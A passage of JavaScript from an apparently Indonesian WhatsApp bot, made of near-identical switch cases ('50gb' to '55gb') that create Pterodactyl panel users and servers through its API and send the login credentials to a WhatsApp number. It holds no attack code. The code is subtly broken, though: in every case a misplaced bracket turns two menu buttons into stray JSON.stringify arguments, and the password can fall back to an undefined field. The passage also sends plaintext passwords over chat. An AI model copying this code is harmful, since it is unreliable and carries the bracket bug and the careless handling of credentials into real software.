"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 49175
│ • *DISK :* 49175
│ • *CPU :* 1470%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "50gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "50200"
let cpu = "1500"
let disk = "50200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 50200 / 50 GB
│ • DISK : 50200 / 50 GB
│ • CPU : 1500%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 50200 / 50 GB
│ • *DISK :* 50200 / 50 GB
│ • *CPU :* 1500%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "51gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "51200"
let cpu = "1530"
let disk = "51200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 51200 / 51 GB
│ • DISK : 51200 / 51 GB
│ • CPU : 1530%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 51200 / 51 GB
│ • *DISK :* 51200 / 51 GB
│ • *CPU :* 1530%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "52gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "52200"
let cpu = "1560"
let disk = "52200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 52200 / 52 GB
│ • DISK : 52200 / 52 GB
│ • CPU : 1560%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 52200 / 52 GB
│ • *DISK :* 52200 / 52 GB
│ • *CPU :* 1560%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "53gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "53200"
let cpu = "1590"
let disk = "53200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 53200 / 53 GB
│ • DISK : 53200 / 53 GB
│ • CPU : 1590%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 53200 / 53 GB
│ • *DISK :* 53200 / 53 GB
│ • *CPU :* 1590%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "54gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "54200"
let cpu = "1620"
let disk = "54200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 54200 / 54 GB
│ • DISK : 54200 / 54 GB
│ • CPU : 1620%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 54200 / 54 GB
│ • *DISK :* 54200 / 54 GB
│ • *CPU :* 1620%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "55gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "55200"
let cpu = "1650"
let disk = "55200"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭──────────────────┈ ⳹
│『 *DATA PANEL ANDA* 』
├────┈ ⳹
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • RAM : 55200 / 55 GB
│ • DISK : 55200 / 55 GB
│ • CPU : 1650%
├────┈ ⳹
╰──────────────────┈ ⳹
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT SERVER* 』
├────┈ ⳹
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├──────────────────┈ ⳹
│『 *SPESIFIKASI SERVER* 』
├────┈ ⳹
│ • *RAM :* 55200 / 55 GB
│ • *DISK :* 55200 / 55 GB
│ • *CPU :* 1650%
├────┈ ⳹
╰──────────────────┈ ⳹

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "56gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
